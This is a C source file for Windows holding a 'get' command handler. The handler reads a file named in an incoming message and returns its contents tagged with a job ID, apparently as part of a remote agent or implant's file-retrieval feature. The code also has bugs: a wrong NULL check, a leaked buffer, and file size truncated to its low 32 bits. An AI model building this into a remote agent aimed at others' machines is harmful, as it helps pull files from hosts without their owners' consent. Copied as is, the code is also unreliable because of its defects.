#include "error.h"
#include "message.h"
#include "debug.h"
#include <windows.h>

/*
@brief Function that gets a file
@param PMESSAGE containts the parameters for the command
@param PMESSAGE is a pointer to the result that will be sent back
@return ERROR_T with status of dir
*/
ERROR_T GetCmd(PMESSAGE pMsg, PMESSAGE *pResult) {
    INT iError = E_SUCCESS;
    PDWORD pRemoteFileNameLen = NULL;
    PCHAR pRemoteFileName = NULL;
    PBYTE pFileBuf = NULL;
    HANDLE hFile = INVALID_HANDLE_VALUE;

    *pResult = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(MESSAGE));
    if (NULL == pResult) {
        iError = E_MEMORY_ERROR;
        goto end;
    }

    pRemoteFileNameLen = (PDWORD) pMsg->pData;
    pRemoteFileName = (PCHAR) ((PBYTE) pMsg->pData + sizeof(DWORD));

    DBG_PRINT("Getting: %s:%d\n", pRemoteFileName, *pRemoteFileNameLen);

    LARGE_INTEGER liFileSize = {0};

    hFile = CreateFileA(pRemoteFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (INVALID_HANDLE_VALUE == hFile) {
        DBG_PRINT("%d\n", GetLastError());
        iError = E_GET_ERROR;
        goto end;
    }

    if (0 == GetFileSizeEx(hFile, &liFileSize)) {
        iError = E_GET_ERROR;
        goto end;
    }

    DWORD dwBytesRead = 0;
    pFileBuf = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, liFileSize.LowPart);
    if (NULL == pFileBuf) {
        iError = E_MEMORY_ERROR;
        goto end;
    }

    if (0 == ReadFile(hFile, pFileBuf, liFileSize.LowPart, &dwBytesRead, NULL)) {
        iError = E_GET_ERROR;
        goto end;
    }

end:
    if (INVALID_HANDLE_VALUE != hFile) {
        CloseHandle(hFile);
    }

    (*pResult)->hdr.dwCommand = pMsg->hdr.dwCommand;
    (*pResult)->hdr.dwJobID = pMsg->hdr.dwJobID;
    (*pResult)->hdr.dwMessageSize = sizeof(MESSAGE_HEADER);
    (*pResult)->hdr.dwResultCode = iError;

    if (E_SUCCESS == iError) {
        (*pResult)->hdr.dwMessageSize += dwBytesRead;
        (*pResult)->pData = pFileBuf;
    }

    return iError;
}